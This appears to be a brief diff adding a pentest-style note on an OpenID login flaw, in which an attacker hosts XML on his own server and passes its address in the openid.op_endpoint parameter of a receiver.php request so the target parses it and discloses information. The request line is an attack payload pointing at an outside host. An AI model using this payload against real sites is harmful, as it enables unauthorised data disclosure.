@@ -1,0 +1,8 @@
+
+
+Open ID - login using Google account.
+attacker host the xml in his server.
+
+/openid/receiver.php?provider_id=1010459756371&openid.op_endpoint=132.321.222.120
+
+web parsing will parse and list out all the information.
